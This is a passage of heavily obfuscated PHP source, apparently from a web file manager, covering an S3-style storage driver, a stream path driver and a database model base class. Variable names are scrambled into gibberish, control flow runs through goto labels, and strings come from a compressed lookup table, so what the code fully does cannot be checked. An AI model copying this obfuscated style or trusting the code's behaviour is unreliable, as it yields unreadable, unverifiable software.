²¯[$aä¯ø‘…[168]]; goto fï¤ùÆª†‚; fï¤ùÆª†‚: $aõå¿¯ß§ô = $this->client->__getSignatureV4($cÏ‰¥ĞÛˆ, $aƒó©É£, $AÍÈÀÙ‡·å, $CæÀ½× ˆ´, $bóì«áóÄ); return array($aä¯ø‘…[232] => $aõå¿¯ß§ô[$aä¯ø‘…[232]], $aä¯ø‘…[222] => $aõå¿¯ß§ô[$aä¯ø‘…[1357]], $aä¯ø‘…[234] => $c‰©Çøí²ğ, $aä¯ø‘…[1354] => $aõå¿¯ß§ô[$aä¯ø‘…[1354]]); goto c‚æÒª™ğî; e¥óà÷ò¬: if (!$c‰©Çøí²ğ) { return !1; } $bóì«áóÄ = $aä¯ø‘…[1358]; foreach ($c‰©Çøí²ğ as $eõÄÅ´ÊÂÙ) { $bóì«áóÄ .= $aä¯ø‘…[1359] . "\x3c\120\x61\162\x74\x4e\165\155\142\x65\x72\x3e{$eõÄÅ´ÊÂÙ[$aä¯ø‘…[1315]]}\x3c\x2f\120\x61\x72\x74\116\x75\x6d\142\145\162\76\12" . "\74\105\x54\141\147\x3e{$eõÄÅ´ÊÂÙ[$aä¯ø‘…[1316]]}\74\x2f\x45\x54\141\x67\x3e\xa" . $aä¯ø‘…[1360]; } goto F¬¬ó…¯Ó; F¬¬ó…¯Ó: $bóì«áóÄ .= $aä¯ø‘…[1361]; $cÏ‰¥ĞÛˆ = array(); $D ×”Ì‡ğ… = explode($aä¯ø‘…[177], $this->getHost()); goto e´Ú«ğî°Ç; c‚æÒª™ğî: } public function link($d¦ÌàË¶Ë˜, $A–äßóƒì = array()) { return parent::link($d¦ÌàË¶Ë˜, $A–äßóƒì); } public function fileOut($eñà‹ñ±Ü, $FåĞÕœ”·Û = false, $EèÌï†“Ïé = false, $AÑó˜Şßğ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ö‘Øù][1362])) { return parent::fileOutServer($eñà‹ñ±Ü, $FåĞÕœ”·Û, $EèÌï†“Ïé, $AÑó˜Şßğ); } parent::fileOut($eñà‹ñ±Ü, $FåĞÕœ”·Û, $EèÌï†“Ïé, $AÑó˜Şßğ); } public function fileOutImage($DŸ¨ÕËîßƒ, $E‚…­…´‹ = 250) { if (strstr($this->endpoint, $_SERVER[Ö‘Øù][1362])) { return parent::fileOutImageServer($DŸ¨ÕËîßƒ, $E‚…­…´‹); } parent::fileOutImage($DŸ¨ÕËîßƒ, $E‚…­…´‹); } public function fileOutLink($EÅ·‰í®Şõ) { $E†•ÚŸ•– =& $_SERVER[Ö‘Øù]; if (substr($EÅ·‰í®Şõ, 0, 7) == $E†•ÚŸ•–[1238]) { $EÅ·‰í®Şõ = $E†•ÚŸ•–[1239] . substr($EÅ·‰í®Şõ, 7); } header($E†•ÚŸ•–[159] . $EÅ·‰í®Şõ); die; } public function getHost() { $f®ÅÁ¬¦¾é =& $_SERVER[Ö‘Øù]; $bˆÆÜŒŒÊø = str_rtrim(parent::getHost(), $f®ÅÁ¬¦¾é[8] . $this->bucket); $bˆÆÜŒŒÊø = explode($f®ÅÁ¬¦¾é[177], $bˆÆÜŒŒÊø); return $bˆÆÜŒŒÊø[0] . $f®ÅÁ¬¦¾é[177] . $this->bucket . $f®ÅÁ¬¦¾é[95] . $bˆÆÜŒŒÊø[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($DÉÕ¯ŠŸ”«, $AÈ•É™ºáä = 0) { parent::__construct(); $this->source = $DÉÕ¯ŠŸ”«; $this->sourceSize = $AÈ•É™ºáä; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($DÕÆ¥§ = false) { return $this->sourceSize; } public function getContent($a×ãÁ¼Ú© = false) { return $this->fileSubstr($a×ãÁ¼Ú©, 0, $this->sourceSize); } public function fileSubstr($fÚ‚×©çğ¯ = false, $f°ÅéÏÆ = 0, $D—î«å´‡à = 0) { if (!$D—î«å´‡à) { $D—î«å´‡à = $this->sourceSize; } $AäÎÚŠáåÔ = $this->sourceSize - $f°ÅéÏÆ; if ($D—î«å´‡à >= $AäÎÚŠáåÔ) { $D—î«å´‡à = $AäÎÚŠáåÔ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $f°ÅéÏÆ, $D—î«å´‡à); } if ($this->sourceType == self::TYPE_FILE) { if ($D—î«å´‡à <= 0) { return $_SERVER[Ö‘Øù][33]; } $dÉØØ“Şã = ftell($this->source); fseek_64($this->source, $dÉØØ“Şã + $f°ÅéÏÆ); $e¸ƒõæ†‡ = @fread($this->source, $D—î«å´‡à); fseek_64($this->source, $dÉØØ“Şã); return $e¸ƒõæ†‡; } } public function hashMd5($bˆ‹™Ï‹îù = false) { return md5($this->getContent()); } public static function hash($b‘Çß¸ Û, $fŞ«‚÷…À· = 0) { $Eó’£ôïô = new PathDriverStream($b‘Çß¸ Û, $fŞ«‚÷…À·); return $Eó’£ôïô->hashSimple($b‘Çß¸ Û); } public static function md5($E¯§èÎ», $côƒÏ¿´ÀÄ = 0) { $AˆÀ§«ŞªÁ = new PathDriverStream($E¯§èÎ», $côƒÏ¿´ÀÄ); return $AˆÀ§«ŞªÁ->hashMd5($E¯§èÎ»); } } goto AïˆÆ¬¡‹Ğ; açŒ«­Â¦: define($_SERVER[Ö‘Øù][0], $_SERVER[Ö‘Øù][1]); $_SERVER[¦¦åº…Öñ] = explode($_SERVER[Ö‘Øù][2], gzinflate(substr($_SERVER[Ö‘Øù][3], 10, -8))); function binCheckEq($a»÷ŠÒ½ Í, $CÅ—‰ŞÊÇ) { return $a»÷ŠÒ½ Í == $CÅ—‰ŞÊÇ; } goto BÏİ„õÑ; FÁ£œÙß: class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\155\x6f\x64\151\x66\171\x54\x69\x6d\145", "\164\151\x6d\145", "\151\156\163\145\x72\x74\54\165\160\x64\141\164\x65", "\x66\x75\156\x63\164\x69\157\156"), array("\x63\x72\145\x61\164\145\124\151\x6d\x65", "\x74\151\x6d\145", "\x69\156\163\145\x72\164", "\x66\x75\x6e\143\x74\151\157\x6e")); public function setDataAuto($fšÆß•“‰â) { $this->dataAuto = $fšÆß•“‰â; } public function __construct($däƒ•½³ = '', $FÃ®ƒ×ŸêŸ = '', $aÃÈë»·§ = '') { parent::__construct($däƒ•½³, $FÃ®ƒ×ŸêŸ, $aÃÈë»·§); } protected $tableMeta = array(); protected function _beforeInsert(&$A÷Ò›§«é‚, $Aö½Â«ÃÃÃ) { $F°°²¾«•‚ =& $_SERVER[Ö‘Øù]; if (!$this->checkDataAutoHas($F°°²¾«•‚[353])) { return; } $this->dataBeforeFilter($A÷Ò›§«é‚, $F°°²¾«•‚[353]); } protected function _beforeUpdate(&$C·Ê¿ÆÄ”ğ, $d¡ö‚Ûƒƒ¢) { $E‡§ÄÛŸ =& $_SERVER[Ö‘Øù]; if (!$this->checkDataAutoHas($E‡§ÄÛŸ[354])) { return; } $this->dataBeforeFilter($C·Ê¿ÆÄ”ğ, $E‡§ÄÛŸ[354]); } protected function _afterSelect(&$E°’ÉĞˆŠä, $dö™õù˜†Š) { if (!is_array($E°’ÉĞˆŠä)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö‘Øù][355])) { return; } foreach ($E°’ÉĞˆŠä as &$a¬Á ¶ª½ğ) { $this->dataAfterFilter($a¬Á ¶ª½ğ); } unset($a¬Á ¶ª½ğ); } protected function _afterFind(&$bÊÁïñÚÎÆ, $AÇŸ®£†) { if (!is_array($bÊÁïñÚÎÆ)) { return; } if (!$this->checkDataAutoHas($_SERVER[Ö‘Øù][355])) { return; } $this->dataAfterFilter($bÊÁïñÚÎÆ); } public static function textEncode($DË¢ˆÑºÙÃ) { if (!$DË¢ˆÑºÙÃ) { return $DË¢ˆÑºÙÃ; } $AôŸ ‘ª“ = json_encode($DË¢ˆÑºÙÃ); $AôŸ ‘ª“ = preg_replace_callback($_SERVER[Ö‘Øù][356], function ($fØ ©¶À‹Ä) { return addslashes($fØ ©¶À‹Ä[0]); }, $AôŸ ‘ª“); return json_decode($AôŸ ‘ª“); } public static function textDecode($DÄ‰¯¨¡…á) { $Dšƒ²¶è‰› =& $_SERVER[Ö‘Øù]; $DîÏâÒµÅÃ = json_encode($DÄ‰¯¨¡…á); $DîÏâÒµÅÃ = preg_replace_callback($Dšƒ²¶è‰›[357], function ($a¬»¨«‚µ) { return $_SERVER[Ö‘Øù][97]; }, $DîÏâÒµÅÃ); return json_decode($DîÏâÒµÅÃ); } public function setAutoIncrement($a™ÑÁ±ğíƒ) { $FùÈ©Ïƒ¸¹ = array($this->getPk() => $a™ÑÁ±ğíƒ); $bæ©®« = $this->data($FùÈ©Ïƒ¸¹)->add(); if ($bæ©®«) { $this->delete($bæ©®«); } } public function getAutoIncrement() { $fĞòÈòáİº = $this->getTableName(); $d‰š±šÙÊ‚ = $this->max($this->getPk()); $AÎ†¹®„Ì½ = $this->query("\x73\150\x6f\x77\40\164\141\x62\154\145\x20\163\x74\x61\x74\x75\163\x20\x77\150\145\162\x65\x20\x4e\141\x6d\145\x3d\x27{$fĞòÈòáİº}\47"); $AÄä—‚õ¼® = $AÎ†¹®„Ì½[0][$_SERVER[Ö‘Øù][358]]; $cÛšÍ´ò­ = max($d‰š±šÙÊ‚, $AÄä—‚õ¼®); return $cÛšÍ´ò­; } protected function _callBefore($fËå¡ª‹Ë, $BÚåçë•À) { return $this->cacheCallCheck($fËå¡ª‹Ë, $BÚåçë•À, !1); } protected function _callAfter($FĞìÇÑƒÕ, $d¾…ê£›Å) { return $this->cacheCallCheck($FĞìÇÑƒÕ, $d¾…ê£›Å, !0); } protected function cacheFunctionAlias($Có“ÍˆŞÓÜ) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($F¿¥ÑŸÁËÃ, $e—­ËÛÚôŒ, $Cˆ–Á‹Š¦ç = false) { $EŞãë•‡‚˜ = $this->cacheFunctionAlias($e—­ËÛÚôŒ); if (!$EŞãë•‡‚˜) { return; } foreach ($EŞãë•‡‚˜ as $Aó·¤ÆÀá => $A÷ë—øéÌ¸) { $bÆ«±Ãµ‹ = $A÷ë—øéÌ¸[0]; $F°®Ã½ßÖ = explode($_SERVER[Ö‘Øù][47], $A÷ë—øéÌ¸[1]); if ($F¿¥ÑŸÁËÃ == $Aó·¤ÆÀá) { return $this->cacheFunctionGet($Aó·¤ÆÀá, $bÆ«±Ãµ‹); } if ($Cˆ–Á‹Š¦ç && in_array($F¿¥ÑŸÁËÃ, $F°®Ã½ßÖ)) { $this->cacheFunctionClear($Aó·¤ÆÀá, $bÆ«±Ãµ‹); } } } public function cacheFunctionGet($b‘êÈ¯³õ, $E‰¢Ÿø ·) { $D½£ßã´ÇÅ = $this->cacheKeyMake($b‘êÈ¯³õ, $E‰¢Ÿø ·); $b³£¤µ½æ = Cache::get($D½£ßã´ÇÅ); if (!is_array($b³£¤µ½æ)) { $b³£¤µ½æ = call_user_func_array(array($this, $b‘êÈ¯³õ), array($E‰¢Ÿø ·, !0)); Cache::set($D½£ßã´ÇÅ, $b³£¤µ½æ); } return $b³£¤µ½æ; } public function cacheFunctionClear($e²‚ê·æÅã, $dÔâñ³ØÊ) { $A‡Šƒï‡¶º = $dÔâñ³ØÊ; if (!is_array($dÔâñ³ØÊ)) { $A‡Šƒï‡¶º = array($dÔâñ³ØÊ); } foreach ($A‡Šƒï‡¶º as $A†¤ŒŸ×‘’) { $dó¼ø˜ÇÂ° = $this->cacheKeyMake($e²‚ê·æÅã, $A†¤ŒŸ×‘’); Cache::remove($dó¼ø˜ÇÂ°); } } private function cacheKeyMake($eŠ‚ğñƒ‡, $cñ†¼«¨™) { $eøòâ»¡ñÂ =& $_SERVER[Ö‘Øù]; return get_class($this) . $eøòâ»¡ñÂ[71] . $eŠ‚ğñƒ‡ . $eøòâ»¡ñÂ[359] . $cñ†¼«¨™; } protected function selectPageReset() { $FŠª„Ç²é =& $_SERVER[Ö‘Øù]; if (isset($GLOBALS[$FŠª„Ç²é[360]])) { return; } $GLOBALS[$FŠª„Ç²é[360]] = isset($GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[361]]) ? $GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[361]] : !1; $GLOBALS[$FŠª„Ç²é[362]] = isset($GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[351]]) ? $GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[351]] : !1; $GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[361]] = !1; $GLOBALS[$FŠª„Ç²é[7]][$FŠª„Ç²é[351]] = !1; } protected function selectPageRestore() { $cÊì¡ÏÖ¾ =& $_SERVER[Ö‘Øù]; if (!isset($GLOBALS[$cÊì¡ÏÖ¾[360]])) { return; } $GLOBALS[$cÊì¡ÏÖ¾[7]][$cÊì¡ÏÖ¾[361]] = $GLOBALS[$cÊì¡ÏÖ¾[360]]; $GLOBALS[$cÊì¡ÏÖ¾[7]][$cÊì¡ÏÖ¾[351]] = $GLOBALS[$cÊì¡ÏÖ¾[362]]; unset($GLOBALS[$cÊì¡ÏÖ¾[360]]); unset($GLOBALS[$cÊì¡ÏÖ¾[362]]); } protected function selectPage($bÊí˜Ñ ¼ô = 200, $Aí£Ä¥ÁòÉ = 1) { goto A¹è×Œ¼ëç; DĞ•Á„øõì: $E®Œ¾÷œ = 50000; $bÊí˜Ñ ¼ô = isset($in[$f–¡êÜæäé[361]]) && $in[$f–¡êÜæäé[361]] ? $in[$f–¡êÜæäé[361]] : $bÊí˜Ñ ¼ô; if ($bÊí˜Ñ ¼ô === -1) { $in[$f–¡êÜæäé[361]] = !1; $E®Œ¾÷œ = 100000000; $bÊí˜Ñ ¼ô = $E®Œ¾÷œ; } goto F×„ŞøéµÊ; b¿İÅ´î¶: $F†ÖÒ‚Óó = array(); $aø¯ÌÊğ±£ = 1; if ($Aí£Ä¥ÁòÉ == 1 && $aø¯ÌÊğ±£) { $this->optionsValue($cÓìÖ»¿À); $F†ÖÒ‚Óó = $this->page($Aí£Ä¥ÁòÉ, $bÊí˜Ñ ¼ô)->select(); $F‡¨Œ¨Ó = is_array($F†ÖÒ‚Óó) ? count($F†ÖÒ‚Óó) : 0; if ($F‡¨Œ¨Ó < $bÊí˜Ñ ¼ô) { $C×µ½Éß•„ = 1; } else { $this->optionsValue($cœ¾ˆŠÁ´è); $F‡¨Œ¨Ó = intval($this->count()); $C×µ½Éß•„ = ceil($F‡¨Œ¨Ó / $bÊí˜Ñ ¼ô); } } else { $this->optionsValue($cœ¾ˆŠÁ´è); $F‡¨Œ¨Ó = intval($this->count()); $C×µ½Éß•„ = ceil($F‡¨Œ¨Ó / $bÊí˜Ñ ¼ô); $Aí£Ä¥ÁòÉ = $Aí£Ä¥ÁòÉ >= $C×µ½Éß•„ ? $C×µ½Éß•„ : $Aí£Ä¥ÁòÉ; $this->optionsValue($cÓìÖ»¿À); $F†ÖÒ‚Óó = $this->page($Aí£Ä¥ÁòÉ, $bÊí˜Ñ ¼ô)->select(); } goto Cˆ‡ˆè—ùƒ; EíŞ¯îˆ: $bÊí˜Ñ ¼ô = $bÊí˜Ñ ¼ô <= 5 ? 5 : ($bÊí˜Ñ ¼ô >= $E®Œ¾÷œ ? $E®Œ¾÷œ : $bÊí˜Ñ ¼ô); $Aí£Ä¥ÁòÉ = intval(isset($in[$f–¡êÜæäé[351]]) && $in[$f–¡êÜæäé[351]] ? $in[$f–¡êÜæäé[351]] : $Aí£Ä¥ÁòÉ); $Aí£Ä¥ÁòÉ = $Aí£Ä¥ÁòÉ <= 1 ? 1 : $Aí£Ä¥ÁòÉ; goto b¿İÅ´î¶; Cˆ‡ˆè—ùƒ: if (!is_array($F†ÖÒ‚Óó)) { $F†ÖÒ‚Óó = array(); } if ($C×µ½Éß•„ == 1) { $F‡¨Œ¨Ó = count($F†ÖÒ‚Óó); } $E™ˆí°¡Œê = array($f–¡êÜæäé[364] => array($f–¡êÜæäé[365] => $F‡¨Œ¨Ó, $f–¡êÜæäé[361] => $bÊí˜Ñ ¼ô, $f–¡êÜæäé[351] => $Aí£Ä¥ÁòÉ, $f–¡êÜæäé[366] => $C×µ½Éß•„), $f–¡êÜæäé[367] => $F†ÖÒ‚Óó); goto bî¹ğÔÆÌ½; A¹è×Œ¼ëç: $f–¡êÜæäé =& $_SERVER[Ö‘Øù]; global $in; $cÓìÖ»¿À = $this->optionsValue(); goto DĞ•Á„øõì; F×„ŞøéµÊ: $cœ¾ˆŠÁ´è = $cÓìÖ»¿À; $cœ¾ˆŠÁ´è[$f–¡êÜæäé[363]] = array(); $bÊí˜Ñ ¼ô = intval($bÊí˜Ñ ¼ô); goto EíŞ¯îˆ; bî¹ğÔÆÌ½: return $E™ˆí°¡Œê; goto aˆÈé¹é²; aˆÈé¹é²: } protected function checkLength($A‹ØŞ×ˆµ, $EÁ©¶‚œ³ = 0, $B–‹³ùöã« = '') { $C „Ôİà«Â =& $_SERVER[Ö‘Øù]; $EÁ©¶‚œ³ = $EÁ©¶‚œ³ ? $EÁ©¶‚œ³ : 65536; if (!$A‹ØŞ×ˆµ || strlen($A‹ØŞ×ˆµ) < $EÁ©¶‚œ³) { return; } $B–‹³ùöã« = $B–‹³ùöã« ? $B–‹³ùöã« . $C „Ôİà«Â[68] : $C „Ôİà«Â[33]; show_json($B–‹³ùöã« . LNG($C „Ôİà«Â[368]) . "\x28{$EÁ©¶‚œ³}\51", !1); } protected function metaSet($DÊŸ¼¿–±, $c¥ÛÏÎ¾ = null, $DÎÓÕ¯­ƒÍ = null) { goto b¤ç©áå‰¨; b¤ç©áå‰¨: $aÜ ÀîùÙ =& $_SERVER[Ö‘Øù]; if (!$this->tableMeta || !$DÊŸ¼¿–±) { return !1; } $dâğãè’‚Ø = $this->tableMeta[$aÜ ÀîùÙ[369]]; goto bˆ»¡ñÙï; DÁ©¡‰Ç: CacheLock::unlock($D ŸÅ£ÑÕÓ); return !0; goto eïøÚùäæš; dÖù¢™õƒ´: if (is_string($c¥ÛÏÎ¾)) { $d®İí¡›¤æ[$c¥ÛÏÎ¾] = $DÎÓÕ¯­ƒÍ; } $dßÑÀ‘˜ = array(); foreach ($d®İí¡›¤æ as $fÎ›ÀÜ’òÊ => $Fƒí¶ŠùÁŒ) { if (is_null($Fƒí¶ŠùÁŒ) && is_string($fÎ›ÀÜ’òÊ)) { $B¼ç—ÛÁß•->where(array($dâğãè’‚Ø => $DÊŸ¼¿–±, $aÜ ÀîùÙ[371] => $fÎ›ÀÜ’òÊ))->delete(); continue; } $this->checkLength($Fƒí¶ŠùÁŒ, !1, $dÊçõö×Ù¤ . $aÜ ÀîùÙ[4] . $fÎ›ÀÜ’òÊ); $dßÑÀ‘˜[] = array($dâğãè’‚Ø => $DÊŸ¼¿–±, $aÜ ÀîùÙ[93] => $fÎ›ÀÜ’òÊ, $aÜ ÀîùÙ[372] => $Fƒí¶ŠùÁŒ); } goto C·ĞÅÏæ¼; C·ĞÅÏæ¼: $D ŸÅ£ÑÕÓ = $aÜ ÀîùÙ[373] . $this->tableMeta; CacheLock::lock($D ŸÅ£ÑÕÓ); $B¼ç—ÛÁß•->where(array($dâğãè’‚Ø => $DÊŸ¼¿–±))->addAll($dßÑÀ‘˜, array(), !0); goto DÁ©¡‰Ç; bˆ»¡ñÙï: $dÊçõö×Ù¤ = $this->tableMeta[$aÜ ÀîùÙ[370]]; $B¼ç—ÛÁß• = Model($dÊçõö×Ù¤); $a‡éêäŠ´¾ = array($dâğãè’‚Ø => $DÊŸ¼¿–±, $aÜ ÀîùÙ[371] => $c¥ÛÏÎ¾); goto A¼î‚ø¶È; A¼î‚ø¶È: if (is_null($c¥ÛÏÎ¾)) { return $B¼ç—ÛÁß•->where(array($dâğãè’‚Ø => $DÊŸ¼¿–±))->delete(); } if (is_null($DÎÓÕ¯­ƒÍ) && is_string($c¥ÛÏÎ¾)) { return $B¼ç—ÛÁß•->where($a‡éêäŠ´¾)->delete(); } $d®İí¡›¤æ = is_array($c¥ÛÏÎ¾) ? $c¥ÛÏÎ¾ : array(); goto dÖù¢™õƒ´; eïøÚùäæš: } public function metaGet($dÍöµÜÊ©ó, $eÙ»µŒèÙª = false) { goto fÍ”»ãõØŒ; fÍ”»ãõØŒ: $fòšêõÓ”Œ =& $_SERVER[Ö‘Øù]; if (!$this->tableMeta) { return array(); } $Dİ¿ç‰±ò = $this->tableMeta[$fòšêõÓ”Œ[369]]; goto aó’‡„Ñàğ; aó’‡„Ñàğ: $c‘‰Šæ˜ŸÍ = Model($this->tableMeta[$fòšêõÓ”Œ[370]]); if ($eÙ»µŒèÙª) { $F”Ö•°ÄÃ = array($Dİ¿ç‰±ò => $dÍöµÜÊ©ó, $fòšêõÓ”Œ[93] => $eÙ»µŒèÙª); return $c‘‰Šæ˜ŸÍ->where($F”Ö•°ÄÃ)->getField($fòšêõÓ”Œ[372]); } $F”Ö•°ÄÃ = array($Dİ¿ç‰±ò => $dÍöµÜÊ©ó); goto BîğÑ¹®’›; BîğÑ¹®’›: $e­¿ğìõ‘Š = $c‘‰Šæ˜ŸÍ->field($fòšêõÓ”Œ[374])->where($F”Ö•°ÄÃ)->select(); $e­¿ğìõ‘Š = array_to_keyvalue($e­¿ğìõ‘Š, $fòšêõÓ”Œ[93], $fòšêõÓ”Œ[372]); return $e­¿ğìõ‘Š; goto f’í–‡à¨÷; f’í–‡à¨÷: } private function checkDataAutoHas($eÇ¡˜±ÏÑŒ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $F¾Ô‘Ö‘Òİ) { if (in_array($eÇ¡˜±ÏÑŒ, explode($_SERVER[Ö‘Øù][47], $F¾Ô‘Ö‘Òİ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$F¸¡ß ½», $a®»‹œà¥½) { $E‡¹›õØ˜İ =& $_SERVER[Ö‘Øù]; foreach ($this->dataAuto as $b‡ñÏ¾½‚) { $DÎ•©²ßµ– = $b‡ñÏ¾½‚[0]; if (!in_array($a®»‹œà¥½, explode($E‡¹›õØ˜İ[47], $b‡ñÏ¾½‚[2]))) { continue; } switch (trim($b‡ñÏ¾½‚[3])) { case $E‡¹›õØ˜İ[319]: case $E‡¹›õØ˜İ[320]: $e¬ê§Ö÷Ë = $b‡ñÏ¾½‚[1]; $BøËéä¼² = isset($b‡ñÏ¾½‚[4]) ? (array) $b‡ñÏ¾½‚[4] : array(); if ($e¬ê§Ö÷Ë == $E‡¹›õØ˜İ[197] && array_key_exists($DÎ•©²ßµ–, $F¸¡ß ½»)) { if (!$F¸¡ß ½»[$DÎ•©²ßµ–]) { unset($F¸¡ß ½»[$DÎ•©²ßµ–]); } break; } if (isset($F¸¡ß ½»[$DÎ•©²ßµ–])) { array_unshift($BøËéä¼², $F¸¡ß ½»[$DÎ•©²ßµ–]); } if ($E‡¹›õØ˜İ[319] == $b‡ñÏ¾½‚[3]) { $F¸¡ß ½»[$DÎ•©²ßµ–] = call_user_func_array($e¬ê§Ö÷Ë, $BøËéä¼²); } else { $F¸¡ß ½»[$DÎ•©²ßµ–] = call_user_func_array(array(&$this, $e¬ê§Ö÷Ë), $BøËéä¼²); } break; case $E‡¹›õØ˜İ[268]: if (isset($F¸¡ß ½»[$DÎ•©²ßµ–]) && $F¸¡ß ½»[$DÎ•©²ßµ–]) { $F¸¡ß ½»[$DÎ•©²ßµ–] = call_user_func_array(array(&$this, $b‡ñÏ¾½‚[1]), array($F¸¡ß ½»[$DÎ•©²ßµ–])); } break; case $E‡¹›õØ˜İ[271]: $F¸¡ß ½»[$DÎ•©²ßµ–] = $F¸¡ß ½»[$b‡ñÏ¾½‚[1]]; break; case $E‡¹›õØ˜İ[292]: if (isset($F¸¡ß ½»[$DÎ•©²ßµ–]) && !is_string($F¸¡ß ½»[$DÎ•©²ßµ–])) { $F¸¡ß ½»[$DÎ•©²ßµ–] = json_encode_force($F¸¡ß ½»[$DÎ•©²ßµ–]); } break; case $E‡¹›õØ˜İ[321]: if ($F¸¡ß ½»[$DÎ•©²ßµ–] === $E‡¹›õØ˜İ[33]) { unset($F¸¡ß ½»[$DÎ•©²ßµ–]); } break; case $E‡¹›õØ˜İ[322]: $F¸¡ß ½»[$DÎ•©²ßµ–] = $b‡ñÏ¾½‚[1]; default: break; } } if ($a®»‹œà¥½ == $E‡¹›õØ˜İ[353]) { $A”ÌØ°†ñÓ = strtolower($this->db->getDbType()); if (strpos($A”ÌØ°†ñÓ, $E‡¹›õØ˜İ[9]) !== 0) { return; } $fêÈãâù÷“ = $this->field(!0)->fields; $Bäİ¾Å¢Œ = $fêÈãâù÷“[$E‡¹›õØ˜İ[250]]; if (isset($fêÈãâù÷“[$E‡¹›õØ˜İ[249]])) { unset($Bäİ¾Å¢Œ[$fêÈãâù÷“[$E‡¹›õØ˜İ[249]]]); } foreach ($Bäİ¾Å¢Œ as $BŒáİ˜Ù·— => $a®»‹œà¥½) { if (!isset($F¸¡ß ½»[$BŒáİ˜Ù·—])) { $F¸¡ß ½»[$BŒáİ˜Ù·—] = $E‡¹›õØ˜İ[33]; } } } } private function dataAfterFilter(&$dÀ²¢ê‹ç£) { $føÕ‚¦˜ñÎ =& $_SERVER[Ö‘Øù]; foreach ($this->dataAuto as $DÍ°—ö©¹Œ) { $DŒ¸«¹¢ = $DÍ°—ö©¹Œ[0]; if (!isset($dÀ²¢ê‹ç£[$DŒ¸«¹¢])) { continue; } if (!in_array($føÕ‚¦˜ñÎ[355], explode($føÕ‚¦˜ñÎ[47], $DÍ°—ö©¹Œ[2]))) { continue; } switch (trim($DÍ°—ö©¹Œ[3])) { case $føÕ‚¦˜ñÎ[319]: case $føÕ‚¦˜ñÎ[320]: $A‚çïšÒù’ = isset($DÍ°—ö©¹Œ[4]) ? (array) $DÍ°—ö©¹Œ[4] : array(); array_unshift($A‚çïšÒù’, $dÀ²¢ê‹ç£[$DŒ¸«¹¢]); if (isset($DÍ°—ö©¹Œ[4]) && $DÍ°—ö©¹Œ[4] == $føÕ‚¦˜ñÎ[375]) { $A‚çïšÒù’ = array($dÀ²¢ê‹ç£[$DŒ¸«¹¢]); } if ($føÕ‚¦˜ñÎ[319] == $DÍ°—ö©¹Œ[3]) { $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = call_user_func_array($DÍ°—ö©¹Œ[1], $A‚çïšÒù’); } else { $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = call_user_func_array(array(&$this, $DÍ°—ö©¹Œ[1]), $A‚çïšÒù’); } break; case $føÕ‚¦˜ñÎ[268]: if (isset($dÀ²¢ê‹ç£[$DŒ¸«¹¢]) && $dÀ²¢ê‹ç£[$DŒ¸«¹¢]) { $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = call_user_func_array(array(&$this, $DÍ°—ö©¹Œ[1]), array($dÀ²¢ê‹ç£[$DŒ¸«¹¢])); } break; case $føÕ‚¦˜ñÎ[271]: $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = $dÀ²¢ê‹ç£[$DÍ°—ö©¹Œ[1]]; break; case $føÕ‚¦˜ñÎ[292]: $e‰Úùóöª = $dÀ²¢ê‹ç£[$DŒ¸«¹¢]; $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = json_decode($e‰Úùóöª, !0); if (is_null($dÀ²¢ê‹ç£[$DŒ¸«¹¢])) { $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = $e‰Úùóöª; } break; case $føÕ‚¦˜ñÎ[321]: if ($dÀ²¢ê‹ç£[$DŒ¸«¹¢] === $føÕ‚¦˜ñÎ[33]) { unset($dÀ²¢ê‹ç£[$DŒ¸«¹¢]); } break; case $føÕ‚¦˜ñÎ[322]: $dÀ²¢ê‹ç£[$DŒ¸«¹¢] = $DÍ°—ö©¹Œ[1]; break; default: break; } } } public function saveAll($ašóâ¶÷¤£) { goto aá¹‚ëµ¢²; aá¹‚ëµ¢²: $CİŒÆµ¶ÓÂ =& $_SERVER[Ö‘Øù]; $d×îÂÌ‰Ğ‡ = $this->tablePrefix . $this->tableName; $d’˜ß¾±çñ = self::SQL_WHERE_IN_CHUNK; goto aÅö£²¤Ó“; aÒ»£Š¼—“: $this->chunkEventSet(); goto føìÏ©Ôè×; aÅö£²¤Ó“: $ašóâ¶÷¤£ = is_array($ašóâ¶÷¤£) ? $ašóâ¶÷¤£ : array(); $Aïº¿¸ƒ¸ = $CİŒÆµ¶ÓÂ[376]; $cÍÁŒö¬‡ = 0; goto eÒ¥“Æ¤Åé; eÒ¥“Æ¤Åé: $dƒÜÂÇÊÅÌ = array(); $Eèá“£éÆ· = count($ašóâ¶÷¤£); for ($b‰¢àïÖŠ = 0; $b‰¢àïÖŠ < $Eèá“£éÆ·; $b‰¢àïÖŠ++) { $e›†ÌíÆ = $ašóâ¶÷¤£[$b‰¢àïÖŠ]; if (!is_array($e›†ÌíÆ) || count($e›†ÌíÆ) != 4) { continue; } $c”“°èå‰Î = "\125\120\x44\x41\x54\105\x20\140{$d×îÂÌ‰Ğ‡}\x60\40\x53\105\124\40{$e›†ÌíÆ[2]}\40\x3d\40\x43\101\123\105\40{$e›†ÌíÆ[0]}\40\12"; if ($cÍÁŒö¬‡ == 0) { $Aïº¿¸ƒ¸ = $c”“°èå‰Î; } $dƒÜÂÇÊÅÌ[] = $CİŒÆµ¶ÓÂ[116] . $e›†ÌíÆ[1] . $CİŒÆµ¶ÓÂ[116]; $cÍÁŒö¬‡++; $Aïº¿¸ƒ¸ .= 